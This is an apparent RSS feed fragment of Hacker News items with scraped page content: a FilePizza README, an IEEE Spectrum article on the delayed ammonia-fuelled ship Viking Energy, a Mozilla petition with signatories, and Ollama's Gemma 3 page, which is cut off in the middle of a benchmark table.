<p dir="auto">Using <a href="http://www.webrtc.org/" rel="nofollow">WebRTC</a>, FilePizza eliminates the initial upload step required by other web-based file sharing services. Because data is never stored in an intermediary server, the transfer is fast, private, and secure.</p>
<p dir="auto">A hosted instance of FilePizza is available at <a href="https://file.pizza/" rel="nofollow">file.pizza</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">What's new with FilePizza v2</h2><a id="user-content-whats-new-with-filepizza-v2" aria-label="Permalink: What's new with FilePizza v2" href="#whats-new-with-filepizza-v2"></a></p>
<ul dir="auto">
<li>A new UI with dark mode support, now built on modern browser technologies.</li>
<li>Works on most mobile browsers, including Mobile Safari.</li>
<li>Transfers are now directly from the uploader to the downloader's browser (WebRTC without WebTorrent) with faster handshakes.</li>
<li>Uploaders can monitor the progress of the transfer and stop it if they want.</li>
<li>Better security and safety measures with password protection and reporting.</li>
<li>Support for uploading multiple files at once, which downloaders receive as a zip file.</li>
<li>Streaming downloads with a Service Worker.</li>
<li>Out-of-process storage of server state using Redis.</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Development</h2><a id="user-content-development" aria-label="Permalink: Development" href="#development"></a></p>
<div data-snippet-clipboard-copy-content="$ git clone https://github.com/kern/filepizza.git
$ pnpm install
$ pnpm dev
$ pnpm build
$ pnpm start"><pre><code>$ git clone https://github.com/kern/filepizza.git
$ pnpm install
$ pnpm dev
$ pnpm build
$ pnpm start
</code></pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Running with Docker</h2><a id="user-content-running-with-docker" aria-label="Permalink: Running with Docker" href="#running-with-docker"></a></p>
<div data-snippet-clipboard-copy-content="$ pnpm docker:build
$ pnpm docker:up
$ pnpm docker:down"><pre><code>$ pnpm docker:build
$ pnpm docker:up
$ pnpm docker:down
</code></pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Stack</h2><a id="user-content-stack" aria-label="Permalink: Stack" href="#stack"></a></p>
<ul dir="auto">
<li>Next.js</li>
<li>Tailwind</li>
<li>TypeScript</li>
<li>React</li>
<li>PeerJS for WebRTC</li>
<li>View Transitions</li>
<li>Redis (optional)</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">FAQ</h2><a id="user-content-faq" aria-label="Permalink: FAQ" href="#faq"></a></p>
<p dir="auto"><strong>How are my files sent?</strong> Your files are sent directly from your browser to the downloader's browser. They never pass through our servers. FilePizza uses WebRTC to send files. This requires that the uploader leave their browser window open until the transfer is complete.</p>
<p dir="auto"><strong>Can multiple people download my file at once?</strong> Yes! Just send them your short or long URL.</p>
<p dir="auto"><strong>How big can my files be?</strong> As big as your browser can handle.</p>
<p dir="auto"><strong>What happens when I close my browser?</strong> The URLs for your files will no longer work. If a downloader has completed the transfer, that downloader will continue to seed to incomplete downloaders, but no new downloads may be initiated.</p>
<p dir="auto"><strong>Are my files encrypted?</strong> Yes, all WebRTC communications are automatically encrypted using public-key cryptography because of DTLS. You can add an optional password to your upload for an extra layer of security.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">License &amp; Acknowledgements</h2><a id="user-content-license--acknowledgements" aria-label="Permalink: License &amp; Acknowledgements" href="#license--acknowledgements"></a></p>
<p dir="auto">FilePizza is released under the <a href="https://github.com/kern/filepizza/blob/main/LICENSE">BSD 3-Clause license</a>. A huge thanks to <a href="https://dribbble.com/iblowyourdesign" rel="nofollow">iblowyourdesign</a> for the pizza illustration.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Future Is Niri (310 pts)]]></title>
            <link>https://ersei.net/en/blog/niri</link>
            <guid>43342178</guid>
            <pubDate>Wed, 12 Mar 2025 11:42:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ersei.net/en/blog/niri">https://ersei.net/en/blog/niri</a>, See on <a href="https://news.ycombinator.com/item?id=43342178">Hacker News</a></p>
Couldn't get https://ersei.net/en/blog/niri: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[First Ammonia-Fueled Ship Hits a Snag (120 pts)]]></title>
            <link>https://spectrum.ieee.org/ammonia-fuel-2671266100</link>
            <guid>43342071</guid>
            <pubDate>Wed, 12 Mar 2025 11:24:40 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://spectrum.ieee.org/ammonia-fuel-2671266100">https://spectrum.ieee.org/ammonia-fuel-2671266100</a>, See on <a href="https://news.ycombinator.com/item?id=43342071">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-headline="World's First Ammonia-Fueled Ship Hits a Snag"><p>The <em><a href="https://www.equinor.com/news/20240826-worlds-first-ammonia-powered-supply-vessel" target="_blank">Viking Energy</a></em>, an oil platform supply ship<strong></strong>undergoing a pioneering retrofit to run on <a href="https://spectrum.ieee.org/tag/ammonia">ammonia</a> fuel, is now scheduled to begin operations in 2026—two years later than initially planned. Once completed, it will be the first vessel capable of operating full-time on ammonia, marking a major milestone in efforts to reduce <a href="https://spectrum.ieee.org/tag/carbon-dioxide">carbon dioxide</a> (CO<sub>2</sub>) emissions in the maritime industry.</p><p><em>IEEE Spectrum</em> previously reported on ammonia as a <a href="https://spectrum.ieee.org/why-the-shipping-industry-is-betting-big-on-ammonia" target="_blank">potential replacement</a> for <a href="https://spectrum.ieee.org/tag/petroleum">petroleum</a> fuels in the shipping industry in 2021, at which time key stakeholders—including Norwegian energy <a href="https://www.equinor.com/about-us/our-history" rel="noopener noreferrer" target="_blank">giant Equinor</a>, technology provider <a href="https://www.wartsila.com/" rel="noopener noreferrer" target="_blank">Wärtsilä</a>, and shipping company <a href="https://eidesvik.no/" rel="noopener noreferrer" target="_blank">Eidesvik Offshore</a>—expected the <em><a href="https://spectrum.ieee.org/tag/viking">Viking</a> Energy</em> to set sail in 2024. However, progress has slowed.</p><p>Industry experts attribute the delay to the complex infrastructure required to handle ammonia safely. “Ammonia is toxic, explosive, and corrosive. We must use special piping, storage tanks, and trucks outfitted with materials engineered to be both leakproof and resistant to ammonia’s corrosive properties,” says <a href="https://spectrum.ieee.org/port-electrification" target="_self">John Prousalidis</a>, a professor of marine engineering at the <a href="https://www.ntua.gr/en/" rel="noopener noreferrer" target="_blank">National Technical University of Athens</a>. </p><p>A spokesperson for Wärtsilä told<em> IEEE Spectrum</em>  that the delay has not been related to performance or safety issues, but to “ the challenges of being at the forefront of maritime decarbonization.” The spokesperson explains that the project “was <span>originally the demonstrator in the EU-funded <a href="https://www.clean-hydrogen.europa.eu/projects-dashboard/projects-repository/shipfc_en" target="_blank">ShipFC</a> Clean <a href="https://spectrum.ieee.org/tag/hydrogen">Hydrogen</a> Partnership program, which aimed to install a 2-megawatt ammonia-powered fuel cell onboard.” But because </span><span> logistics for the production of solid oxide <a href="https://spectrum.ieee.org/tag/fuel-cells">fuel cells</a> for this application did not mature as quickly as anticipated, the EU organizers put “a temporary pause” on the retrofit. The 2024 deadline was no longer feasible, but the partnership restarted the project with a specially made <a href="https://spectrum.ieee.org/tag/gas-turbine">gas turbine</a> designed to run on ammonia.</span></p><p><span>When working with first-of-their-kind technologies, timelines can shift — but the ambition remains the same: to make ammonia a viable zero-carbon fuel for the maritime industry,” says the Wärtsilä spokesperson.</span></p><p>Being first comes with a set of challenges that must be overcome. One of the biggest environmental concerns with ammonia-powered ships is the potential release of nitrogen oxides. “Instead of CO<sub>2</sub>, which contributes to <a href="https://spectrum.ieee.org/tag/global-warming">global warming</a>, we could end up with nitrogen oxides, which are lethal to breathe,” says Prousalidis. “To avoid simply swapping one pollutant for another, ammonia propulsion systems must include emissions-control technologies to prevent harmful nitrogen oxides from entering the atmosphere,” he adds.</p><p>A promising alternative to combustion engines is ammonia-powered fuel cells like the one originally slated to power the <em>Viking Energy.</em> Fuel cells generate electricity without producing nitrogen oxide emissions. By avoiding combustion entirely, these fuel cells allow ammonia’s nitrogen content to remain in its inert form, eliminating a key health risk.</p><h2>Ammonia Fuel Delays for <em>Viking Energy</em></h2><p>Despite the challenges, experts believe ammonia could become a mainstream maritime fuel—but not overnight. “Twenty or thirty years ago, the shipping industry made a major shift to <a href="https://spectrum.ieee.org/tag/natural-gas">natural gas</a>, believing it was the fuel of the future. Now, we know it wasn’t the right step,” says Prousalidis.</p><p>Looking back at past fuel transitions, he noted that each shift—from steam to oil, and then to natural gas—took around 20 years to achieve full adoption. He expects a similar timeline for the adoption of ammonia or hydrogen. “We need to be patient while persisting in our efforts and not getting discouraged by early challenges.”</p><p>That perspective aligns with what Equinor’s vice president of renewable and low-carbon technology, Henriette Undrum, told <em>IEEE Spectrum</em> in 2021 when she urged the public to be patient: “We are not just solving one small problem for one ship. It’s part of the bigger picture. It will be a starting point to build up the market for zero-carbon fuels.”</p><p><img alt="The Viking Energy platform supply vessel out at sea." data-rm-shortcode-id="b52ecb33293c195f29b836637393dcb6" data-rm-shortcode-name="rebelmouse-image" data-runner-src="https://spectrum.ieee.org/media-library/the-viking-energy-platform-supply-vessel-out-at-sea.jpg?id=56650806&amp;width=980" height="1446" id="1381b" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/the-viking-energy-platform-supply-vessel-out-at-sea.jpg?id=56650806&amp;width=980" width="2314"><small placeholder="Add Photo Caption...">Eidesvik’s ammonia-powered Viking Energy is now slated to ship out in 2026.</small><small placeholder="Add Photo Credit...">Eidesvik</small></p><p><span>As ammonia and hydrogen gain traction as maritime fuels, seaports could play a pivotal role in in solving ammonia’s chicken-and-egg problem. Energy companies are wary of investing in alternative fuel infrastructure when there aren’t any ships that run on the new fuel, and shipbuilders are want to avoid shelling out hundreds of millions of dollars to build vessels for which there is no steady fuel supply.</span></p><p>“Seaports are already undergoing an energy transformation,” says Prousalidis. “It would make sense for them to operate as energy hubs—producing, storing, and trading <a href="https://spectrum.ieee.org/tag/alternative-fuels">alternative fuels</a> for fuel cells and other power-generation devices.” By doing so, he says, ports could turn a profit while also breaking the stalemate and contributing to global <a href="https://spectrum.ieee.org/tag/decarbonization">decarbonization</a> efforts.</p><p>Although concerns about nitrogen oxide emissions remain, companies <span>including the partnership that is retrofitting the  Viking Energy<strong></strong></span>are reportedly designing post-combustion systems, analogous to the catalytic converters in automobile exhaust systems, to filter out harmful byproducts.  A technique called selective catalytic reduction converts nitrogen oxides into nitrogen and water. Ammonia slip catalysts capture unburned ammonia and break it down into the same two inert products. </p><p>Meanwhile, momentum for ammonia- based propulsion continues to build. <a href="https://www.hanwha.com/companies/hanwha-ocean.do" target="_blank">Hanwha Ocean</a>, a shipbuilder based in Geoje, <a href="https://spectrum.ieee.org/tag/south-korea">South Korea</a> and Houston-based energy technology company Baker Hughes have announced <a href="https://investors.bakerhughes.com/news-releases/news-release-details/baker-hughes-and-hanwha-announce-partnership-develop-small-size" target="_blank">a partnership to develop a commercial ammonia-compatible propulsion system</a> by 2027. The companies are working on <a href="https://spectrum.ieee.org/tag/gas-turbines">gas turbines</a> capable of running on 100 percent ammonia, with dual-fuel options for natural gas.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[EU to impose counter tariffs on $28 billion of US goods (106 pts)]]></title>
            <link>https://www.reuters.com/markets/europe/eu-impose-counter-tariffs-over-28-billion-us-goods-2025-03-12/</link>
            <guid>43341226</guid>
            <pubDate>Wed, 12 Mar 2025 09:18:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.reuters.com/markets/europe/eu-impose-counter-tariffs-over-28-billion-us-goods-2025-03-12/">https://www.reuters.com/markets/europe/eu-impose-counter-tariffs-over-28-billion-us-goods-2025-03-12/</a>, See on <a href="https://news.ycombinator.com/item?id=43341226">Hacker News</a></p>
Couldn't get https://www.reuters.com/markets/europe/eu-impose-counter-tariffs-over-28-billion-us-goods-2025-03-12/: Error: Request failed with status code 401]]></description>
        </item>
        <item>
            <title><![CDATA[Tell Mozilla: it's time to ditch Google (190 pts)]]></title>
            <link>https://mozillapetition.com/</link>
            <guid>43340948</guid>
            <pubDate>Wed, 12 Mar 2025 08:25:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mozillapetition.com/">https://mozillapetition.com/</a>, See on <a href="https://news.ycombinator.com/item?id=43340948">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        

        <p>
          The open, global internet is a remarkable resource that connects us
          all and empowers individuals to share ideas, collaborate, and
          innovate. It embodies our collective hopes for a better future,
          fostering learning, understanding, and solutions to the challenges we
          face together.
        </p>

        <p>
          As passionate supporters of Mozilla and its mission, we want to
          express our thoughts on the current landscape, especially in light of
          the ongoing <em>U.S. v. Google LLC</em> case and its implications for
          Mozilla’s search partnerships. While Mozilla has always championed
          user privacy and an open web, the increasing reliance on Google for
          revenue raises important questions about our shared commitment to
          these values.
        </p>

        <p>
          Now is the time for Mozilla to take bold steps to reinforce its
          identity as a privacy-centric nonprofit and to prioritize the Firefox
          browser as the heart of your mission.
        </p>

        <h2 id="embrace-independence">Embrace Independence</h2>

        <p>
          It is time to reevaluate the partnership with Google and seek
          alternatives that align with Mozilla’s values. By distancing itself
          from Google, Mozilla can reaffirm its commitment to user privacy and
          autonomy, fostering trust among its user base.
        </p>

        <h2 id="focus-on-firefox">Focus on Firefox</h2>

        <p>
          The Firefox browser has been a cornerstone of Mozilla’s identity. By
          concentrating resources and innovation on enhancing Firefox, you can
          improve user experience, performance, and privacy features. This focus
          will not only attract new users but also retain existing ones who
          value a browser that prioritizes their needs.
        </p>

        <h2 id="privacy-first">Sustainable, Privacy-First Ventures</h2>

        <p>
          Firefox needs new revenue streams to be sustainable. New products and
          services under Mozilla’s umbrella should reflect the same commitment
          to privacy that defines Mozilla. By prioritizing user-friendly,
          privacy-respecting practices, you can strengthen your reputation as a
          leader in the digital rights movement.
        </p>

        

        <p>
          Mozilla thrives on the passion and creativity of its community. By
          actively involving users and developers in the conversation, you can
          gather valuable insights and foster a sense of shared ownership in the
          future of Mozilla.
        </p>

        <hr>

        <p>
          The future of Mozilla depends on its ability to remain true to its
          founding principles. By taking decisive action to reinforce your
          commitment to privacy and focusing on the Firefox browser, you can
          continue to lead the way in creating a better internet for everyone.
        </p>

        

        <p>Sincerely,</p>

        <ul>
          <li>
            Alexander Pushkov,
            <a href="https://lunni.dev/?ref=mozillapetition.com">Lunni</a>
          </li>
          <li>Jens Hermansson</li>
          <li>
            <a href="https://predragtasevski.com/" rel="ugc">Predrag Tasevski</a>
          </li>
          <li>F.A.G.J. van Vuuren</li>
          <li>Fokion Sotiropoulos</li>
          <li>Constantinos Pigiotis</li>
          <li>Carl von Köhler</li>
          <li>Tommy Stigen Olsen</li>
          <li>
            <a href="https://abrudz.github.io/" rel="ugc">Adám Brudzewsky</a>
          </li>
          <li>Poomalairaj</li>
          <li>Stephen Hill</li>
          <li>James Crawford</li>
          <li>James O’Connor</li>
          <li><a href="https://ufal.my.id/" rel="ugc">Ufal Salman</a></li>
          <li>
            Vivek Gite,
            <a href="https://www.cyberciti.biz/" rel="ugc">nixCraft</a>
          </li>
          <li>Kahleel Hassan</li>
          <li>Roy Tanck</li>
          <li>Jordan Hollinger</li>
          <li>Zorzu Kasto</li>
          <li>Nash Train</li>
          <li>Oleksandr Natalenko</li>
          <li>
            <a href="https://social.osur.ee/@siim" rel="ugc">Siim Ošur</a>
          </li>
          <li><a href="https://olea.org/" rel="ugc">Ismael Olea</a></li>
          <li>Carlo Patti</li>
          <li>Joseph Johnson</li>
          <li>
            <a href="https://github.com/tcsenpai" rel="ugc">Cristiano Frassineti</a>
          </li>
          <li>Nathaniel Enos</li>
          <li>George Kendall-Smith</li>
          <li>Yan Nichols</li>
          <li>Júlio Dutra Couto</li>
          <li>
            <a href="https://mission1701.com/" rel="ugc">Arég Harutyunyan</a>
          </li>
          <li><a href="https://asterisk.lol/" rel="ugc">Asterisk</a></li>
          <li>Jan Antoš</li>
          <li><a href="https://ajith.co/" rel="ugc">Ajith E.</a></li>
          <li>Jonas Häggqvist</li>
          <li>Gabriel Denis-Gouley</li>
          <li>Ash Tunelid</li>
          <li>
            <a href="https://dariuszworks.co.uk/" rel="ugc">Dariusz Kaminski</a>
          </li>
          <li>
            <a href="https://logicalg.it/" rel="ugc">Francesco Strazzante</a>
          </li>
          <li>Dante Brenner</li>
          <li>Mac Johnson</li>
          <li>Paul Brand</li>
          <li>
            <a href="https://alternatique.fr/" rel="ugc">Nick Kholah Randrianarisoa</a>
          </li>
          <li><a href="https://iamdobhal.dev/" rel="ugc">Ayam Dobhal</a></li>
          <li>Florian Parreno</li>
          <li>
            <a href="https://christian-parsons.com/" rel="ugc">Christian Parsons</a>
          </li>
          <li>Michael Vilain</li>
          <li>Arthur Villessuzanne</li>
          <li><a href="https://dunn.tf/" rel="ugc">Antoine Dunn</a></li>
          <li>Wiger Fels</li>
          <li>Sam Meila</li>
          <li>Ton van Bart</li>
          <li>
            Ankit Singhaniya,
            <a href="https://formester.com/" rel="ugc">Formester</a>
          </li>
          <li>Joshua Rodrigues</li>
          <li>Manoj Kumar R.</li>
          <li>George H. Lenzer</li>
          <li>Alex D.</li>
          <li>Sarvesh V Pawar</li>
          <li>Andrew Myers</li>
          <li><a href="https://cabinetnoir.tech/" rel="ugc">Silur</a></li>
          <li>Martin Prusa</li>
          <li>
            <a href="https://www.jeroen-baert.be/" rel="ugc">Jeroen Baert</a>
          </li>
          <li>Mark Reeves</li>
          <li>
            Nico Beastie Boyce,
            <a href="https://deltastring.com/" rel="ugc">Deltastring</a>
          </li>
          <li>Mohammad Mobin Tasnimi</li>
          <li>Wouter L.</li>
          <li>Yasin Karaaslan</li>
          <li>
            Sam Sepiol, <a href="https://mozillapetition.com/assets/samsepiol.png">E Corp</a>
            <!-- nice reference, thanks -->
          </li>
          <li>
            <a href="https://jacopofranco.com/" rel="ugc">Jacopo Franco</a>
          </li>
          <li>Amrish Chande</li>
          <li>Doryan Tilmant</li>
          <li>Elvira Ramírez</li>
          <li>Oleg Jilin</li>
          <li>Kira Edges</li>
          <li><a href="https://lorendb.dev/" rel="ugc">Loren Burkholder</a></li>
          <li>Adrian</li>
          <li>Samuel Bilý</li>
          <li>Basil Eldho</li>
          <li>Stefano Tambellini</li>
          <li>
            Mario Roth,
            <a href="https://www.quotidianomotori.com/" rel="ugc">Quotidiano Motori</a>
          </li>
          <li><a href="https://jackwalsh.xyz/" rel="ugc">Jack Walsh</a></li>
          <li>Katherin Ortega</li>
          <li>Paolo Grisoli</li>
          <li>Krystyna Pokrzywa</li>
          <li>Robert Nowotniak</li>
          <li>Zsuzsa Fekete</li>
          <li>Vladislav Andreev</li>
          <li>Łukasz Horodecki</li>
          <li>Romaine Martin</li>
          <li>Francesco Chicchiriccò</li>
          <li>Bartosz Kolasinski</li>
          <li>Mauro B.</li>
          <li>Wojciech Wernicki</li>
          <li><a href="https://lynx.st/" rel="ugc">Andrey Viktorov</a></li>
          <li>Kita Lembrik</li>
          <li>Manuchehr</li>
          <li><a href="https://cartercole.com/" rel="ugc">Carter Cole</a></li>
          <li>Matvey Gerasimov</li>
          <li><a href="https://gapp.pp.ua/" rel="ugc">just gapp</a></li>
          <li>Bryan Ashby</li>
          <li>Alexander Sanderson</li>
          <li>Dominik Erdmann</li>
          <li>
            <a href="https://ismail.karsli.net/" rel="ugc">İsmail Karslı</a>
          </li>
          <li>Patryk Gronkiewicz</li>
          <li>Abigail Taylor</li>
          <li>Pete Dermott</li>
          <li>Jacob Peroutek</li>
          <li>Zach Tancrell</li>
          <li>
            Theo Björk,
            <a href="https://www.birchproject.eu/" rel="ugc">The Birch Project</a>
          </li>
          <li>Thorsten Andersson</li>
          <li>Abdeslam Chouimet</li>
          <li>Coen Graafstal</li>
          <li>Dean Maurice</li>
          <li>Chris Kontos</li>
          <li>Garry Cobbum</li>
          <li>Lars Kahlke</li>
          <li>
            Max Mania
            <!-- Is that your real name *and* the name of your blog? Please drop me a line: mozillapetition@ale.sh -->
          </li>
          <li>
            <a href="https://wiki.gentoo.org/wiki/User:Keks24" rel="ugc">Ramon Fischer</a>
          </li>
          <li>
            <a href="https://alignedtrack432.neocities.org/" rel="ugc">AlignedTrack432</a>
          </li>
          <li>Kevin Feeley</li>
          <li>Quoc Kiet</li>
          <li>Meitham Jamaa</li>
          <li>Fuad Munshi</li>
          <li>Osama Muharram</li>
          <li>Kareen Draheim</li>
          <li>Luis Felipe Latuz</li>
          <li>Geoffrey Alglave</li>
          <li>Ronaldo Nascimento</li>
          <li>Ashutosh Nayak</li>
          <li>Lucy Londino</li>
          <li>Kyle Pereira</li>
          <li>Bruno Beaufils</li>
          <li>
            Stephen Davis,
            <a href="https://www.nativeit.net/" rel="ugc">Native IT</a>
          </li>
          <li>Kamil P.</li>
          <li>Bhargav T.</li>
          <li>Guilherme Garcia</li>
          <li>
            <a href="https://blog.voidspace.xyz/" rel="ugc">Ramaseshan S.</a>
          </li>
          <li>
            Alex T. Silverstein,
            <a href="https://www.unifieddigital.com/" rel="ugc">Unified Digital</a>
          </li>
          <li>Adrian Biedrzycki</li>
          <li><a href="https://eleboog.com/" rel="ugc">Kebo</a></li>
          <li>Connolly Strombeck</li>
          <li>
            <a href="https://www.internet-czas-dzialac.pl/" rel="ugc">Internet. Time to Act!</a>
            Foundation
          </li>
          <li>Matti Suoraniemi</li>
          <li>Eimantas Viss</li>
          <li>Grzegorz Gil</li>
          <li>Elliott Demone</li>
          <li>Ivica Kocev</li>
          <li>Dana Bucci</li>
          <li>Richard Mulholland</li>
          <li>Carlos Noguera</li>
          <li>Martin Gergov</li>
          <li>
            Jordi Rivero, CTO,
            <a href="https://leadtech.com/" rel="ugc">Leadtech</a>
          </li>
          <li>Azpam Kantaz</li>
          <li>Aras VR</li>
          <li>
            <a href="https://vova-sosnilo.com/" rel="ugc">Vova Sosnilo</a>
          </li>
          <li>
            <a href="https://agustibau.com/" rel="ugc">Agusti Bau Pericon</a>
          </li>
          <li>Fabio Neves</li>
          <li><a href="https://jkung.ch/" rel="ugc">Jeremy Küng</a></li>
          <li>Aliyu Nauke</li>
          <li><a href="https://rocket9labs.com/" rel="ugc">Trevor Slocum</a></li>
          <li>Wouter W.</li>
          <li>Mehmet Y.</li>
          <li>Manuel Morales</li>
          <li>Yann Mithieux</li>
          <li><a href="https://freakybob.site/" rel="ugc">Freakybob Team</a></li>
          <li>Klas Eskilson</li>
          <li>Hugo Salom</li>
          <li>Karol Riebandt</li>
          <li>
            “user… since Mozilla Suite 0.6RC1” – Jakub Klawiter
          </li>
          <li>Pete Emerson</li>
          <li>Deb Moore</li>
        </ul>
      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Gemma3 – The current strongest model that fits on a single GPU (240 pts)]]></title>
            <link>https://ollama.com/library/gemma3</link>
            <guid>43340785</guid>
            <pubDate>Wed, 12 Mar 2025 07:48:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ollama.com/library/gemma3">https://ollama.com/library/gemma3</a>, See on <a href="https://news.ycombinator.com/item?id=43340785">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
	<div>
		
		<div>
			
<div id="summary">
	<h2 id="summary-display">
		<span id="summary-content">
		
			The current strongest model that fits on a single GPU.
		
		</span>
		
	</h2>
	
</div>

			<div>
				<p><span x-test-size="">1b</span>
					
						<span x-test-size="">4b</span>
					
						<span x-test-size="">12b</span>
					
						<span x-test-size="">27b</span>
					
				</p>
				<p>
					
					  <span>
						<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
						  <path stroke-linecap="round" stroke-linejoin="round" d="M3 16.5v2.25A2.25 2.25 0 005.25 21h13.5A2.25 2.25 0 0021 18.75V16.5M16.5 12L12 16.5m0 0L7.5 12m4.5 4.5V3"></path>
						</svg>
						<span x-test-pull-count="">6,606</span>
						<span>&nbsp;Pulls</span>
					  </span>
					
					
						<span title="Mar 12, 2025 8:44 AM UTC">
							<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
								<path stroke-linecap="round" stroke-linejoin="round" d="M12 6v6h4.5m4.5 0a9 9 0 1 1-18 0 9 9 0 0 1 18 0Z"></path>
							</svg>
							<span>Updated&nbsp;</span>
							<span x-test-updated="">2 hours ago</span>
						</span>
					
				</p>
			</div>
		</div>
		
		
  



		
	</div>
	
  
    
  

  
  
  <div id="readme">
    <p>
      <h2>Readme</h2>

      
    </p>
    <div id="display">
        
          <p><img src="https://ollama.com/assets/library/gemma3/b54bf767-f9c5-4284-b551-a49aebe3a3c2" alt="Google Gemma 3 logo"></p>

<blockquote>
<p>This model requires Ollama 0.6 or later. <a href="https://ollama.com/download" rel="nofollow">Download Ollama</a></p>
</blockquote>

<p>Gemma is a lightweight, family of models from Google built on Gemini technology. The Gemma 3 models are multimodal—processing text and images—and feature a 128K context window with support for over 140 languages. Available in 1B, 4B, 12B, and 27B parameter sizes, they excel in tasks like question answering, summarization, and reasoning, while their compact design allows deployment on resource-limited devices.</p>

<h2>Models</h2>

<h3>Text</h3>

<p><strong>1B parameter model</strong> (32k context window)</p>

<pre><code>ollama run gemma3:1b 
</code></pre>

<h3>Multimodal (Vision)</h3>

<p><strong>4B parameter model</strong> (128k context window)</p>

<pre><code>ollama run gemma3:4b
</code></pre>

<p><strong>12B parameter model</strong> (128k context window)</p>

<pre><code>ollama run gemma3:12b
</code></pre>

<p><strong>27B parameter model</strong> (128k context window)</p>

<pre><code>ollama run gemma3:27b
</code></pre>

<h2>Evaluation</h2>

<p><img src="https://ollama.com/assets/library/gemma3/89dc5a19-179e-4dd3-8e5d-12ad54973148" alt="Chatbot Arena ELO Score"></p>

<h3>Benchmark Results</h3>

<p>These models were evaluated against a large collection of different datasets and
metrics to cover different aspects of text generation:</p>

<h4>Reasoning, logic and code capabilities</h4>

<table>
<thead>
<tr>
<th>Benchmark</th>
<th>Metric</th>
<th>Gemma 3 PT 1B</th>
<th>Gemma 3 PT 4B</th>
<th>Gemma 3 PT 12B</th>
<th>Gemma 3 PT 27B</th>
</tr>
</thead>

<tbody>
<tr>
<td><a href="https://arxiv.org/abs/1905.07830" rel="nofollow">HellaSwag</a></td>
<td>10-shot</td>
<td>62.3</td>
<td>77.2</td>
<td>84.2</td>
<td>85.6</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/1905.10044" rel="nofollow">BoolQ</a></td>
<td>0-shot</td>
<td>63.2</td>
<td>72.3</td>
<td>78.8</td>
<td>82.4</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/1911.11641" rel="nofollow">PIQA</a></td>
<td>0-shot</td>
<td>73.8</td>
<td>79.6</td>
<td>81.8</td>
<td>83.3</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/1904.09728" rel="nofollow">SocialIQA</a></td>
<td>0-shot</td>
<td>48.9</td>
<td>51.9</td>
<td>53.4</td>
<td>54.9</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/1705.03551" rel="nofollow">TriviaQA</a></td>
<td>5-shot</td>
<td>39.8</td>
<td>65.8</td>
<td>78.2</td>
<td>85.5</td>
</tr>

<tr>
<td><a href="https://github.com/google-research-datasets/natural-questions" rel="nofollow">Natural Questions</a></td>
<td>5-shot</td>
<td>9.48</td>
<td>20.0</td>
<td>31.4</td>
<td>36.1</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/1911.01547" rel="nofollow">ARC-c</a></td>
<td>25-shot</td>
<td>38.4</td>
<td>56.2</td>
<td>68.9</td>
<td>70.6</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/1911.01547" rel="nofollow">ARC-e</a></td>
<td>0-shot</td>
<td>73.0</td>
<td>82.4</td>
<td>88.3</td>
<td>89.0</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/1907.10641" rel="nofollow">WinoGrande</a></td>
<td>5-shot</td>
<td>58.2</td>
<td>64.7</td>
<td>74.3</td>
<td>78.8</td>
</tr>

<tr>
<td><a href="https://paperswithcode.com/dataset/bbh" rel="nofollow">BIG-Bench Hard</a></td>
<td></td>
<td>28.4</td>
<td>50.9</td>
<td>72.6</td>
<td>77.7</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/1903.00161" rel="nofollow">DROP</a></td>
<td>3-shot, F1</td>
<td>42.4</td>
<td>60.1</td>
<td>72.2</td>
<td>77.2</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/2304.06364" rel="nofollow">AGIEval</a></td>
<td>3-5-shot</td>
<td>22.2</td>
<td>42.1</td>
<td>57.4</td>
<td>66.2</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/2009.03300" rel="nofollow">MMLU</a></td>
<td>5-shot, top-1</td>
<td>26.5</td>
<td>59.6</td>
<td>74.5</td>
<td>78.6</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/2103.03874" rel="nofollow">MATH</a></td>
<td>4-shot</td>
<td>–</td>
<td>24.2</td>
<td>43.3</td>
<td>50.0</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/2110.14168" rel="nofollow">GSM8K</a></td>
<td>5-shot, maj@1</td>
<td>1.36</td>
<td>38.4</td>
<td>71.0</td>
<td>82.6</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/2311.12022" rel="nofollow">GPQA</a></td>
<td></td>
<td>9.38</td>
<td>15.0</td>
<td>25.4</td>
<td>24.3</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/2009.03300" rel="nofollow">MMLU</a> (Pro)</td>
<td>5-shot</td>
<td>11.2</td>
<td>23.7</td>
<td>40.8</td>
<td>43.9</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/2108.07732" rel="nofollow">MBPP</a></td>
<td>3-shot</td>
<td>9.80</td>
<td>46.0</td>
<td>60.4</td>
<td>65.6</td>
</tr>

<tr>
